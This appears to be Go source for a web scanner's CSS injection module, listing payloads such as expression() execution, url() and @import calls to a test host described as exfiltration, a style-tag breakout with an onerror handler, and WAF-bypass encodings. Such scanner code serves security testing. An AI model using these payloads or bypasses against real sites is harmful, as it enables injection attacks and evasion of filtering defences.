package cssinj

// Payload represents a CSS injection payload.
type Payload struct {
	Value       string
	Marker      string // String to search for in response to confirm injection
	Description string
	WAFBypass   bool
}

// GetPayloads returns standard CSS injection payloads.
func GetPayloads() []Payload {
	return standardPayloads
}

// GetWAFBypassPayloads returns payloads designed to evade WAF filtering.
func GetWAFBypassPayloads() []Payload {
	return wafBypassPayloads
}

// GetAllPayloads returns all CSS injection payloads including WAF bypass variants.
func GetAllPayloads() []Payload {
	all := make([]Payload, 0, len(standardPayloads)+len(wafBypassPayloads))
	all = append(all, standardPayloads...)
	all = append(all, wafBypassPayloads...)
	return all
}

// Standard CSS injection payloads.
// Source: OWASP WSTG-CLNT-05, PayloadsAllTheThings
var standardPayloads = []Payload{
	{
		Value:       "expression(alert('skws'))",
		Marker:      "expression(",
		Description: "CSS expression() for IE code execution",
	},
	{
		Value:       "url('http://skws.test/exfil')",
		Marker:      "url(",
		Description: "CSS url() for data exfiltration",
	},
	{
		Value:       "@import url('http://skws.test/css');",
		Marker:      "@import",
		Description: "CSS @import directive injection",
	},
	{
		Value:       "background:url('http://skws.test/bg')",
		Marker:      "background:url(",
		Description: "CSS background url injection",
	},
	{
		Value:       "};body{background:url('http://skws.test/c')}",
		Marker:      "background:url(",
		Description: "CSS rule breakout with background",
	},
	{
		Value:       "color:red;background-image:url('http://skws.test/img')",
		Marker:      "background-image:url(",
		Description: "CSS property injection with background-image",
	},
	{
		Value:       `</style><img src=x onerror=alert('skws')>`,
		Marker:      "</style>",
		Description: "Style tag breakout to HTML context",
	},
	{
		Value:       "behavior:url('/skws.htc')",
		Marker:      "behavior:url(",
		Description: "IE behavior property injection",
	},
	{
		Value:       "-moz-binding:url('http://skws.test/xbl')",
		Marker:      "-moz-binding:url(",
		Description: "Firefox XBL binding injection",
	},
	{
		Value:       "list-style-image:url('http://skws.test/li')",
		Marker:      "list-style-image:url(",
		Description: "CSS list-style-image injection",
	},
}

// WAF bypass CSS injection payloads.
// Source: PayloadsAllTheThings, HackTricks
var wafBypassPayloads = []Payload{
	{
		Value:       `expre/**/ssion(alert('skws'))`,
		Marker:      "ssion(",
		Description: "CSS comment within expression bypass",
		WAFBypass:   true,
	},
	{
		Value:       `@\0069mport url('http://skws.test/css');`,
		Marker:      "mport",
		Description: "Unicode escape in @import bypass",
		WAFBypass:   true,
	},
	{
		Value:       `@im\port url('http://skws.test/css');`,
		Marker:      "port",
		Description: "Backslash escape in @import bypass",
		WAFBypass:   true,
	},
	{
		Value:       `url\28'http://skws.test/u'\29`,
		Marker:      "url",
		Description: "Hex-encoded parentheses in url() bypass",
		WAFBypass:   true,
	},
}
